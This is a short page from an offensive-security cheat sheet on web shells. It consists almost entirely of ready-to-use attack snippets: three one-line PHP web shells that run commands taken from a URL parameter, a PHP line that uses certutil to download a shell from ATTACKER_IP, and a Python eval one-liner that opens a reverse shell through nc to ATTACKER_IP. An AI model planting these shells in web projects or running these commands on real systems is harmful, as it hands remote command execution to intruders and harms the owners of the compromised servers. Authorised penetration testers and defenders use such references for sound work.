---
sidebar_position: 2
---

# WebShell's - Binaries

- **Static Binaries:** <a class="button button--outline button--warning" href="https://repology.org/">REPOLOGY.org</a> <a class="button button--outline button--warning" href="https://ubuntu.pkgs.org/">PKGS.org</a>


## PHP

- **Simple `PHP` WebShell's**

```php
<?php echo shell_exec($_GET["cmd"]);?>
```

```php
<?php echo "<pre>" . shell_exec($_GET["cmd"]) . "</pre>"; ?>
```

```php
<?php system($_GET['cmd']);?>
```

<br/>

- **`PHP` Downloads The Shell From `Python Server`**

```php
'$var = shell_exec("cmd.exe /C certutil -urlcache -split -f http://ATTACKER_IP/php-shell.php php-shell.php & nslookup test ATTACKER_IP ");' 
'echo $var;
```


## Python

- Executing a `SHELL` from a Running `Python` Instance

```py
eval('__import__("os").system("mkfifo /tmp/dktkcfp; nc ATTACKER_IP 8888 0</tmp/dktkcfp | /bin/sh >/tmp/dktkcfp 2>&1; rm /tmp/dktkcfp")')
```

```py
__import__('os').system('bash')
```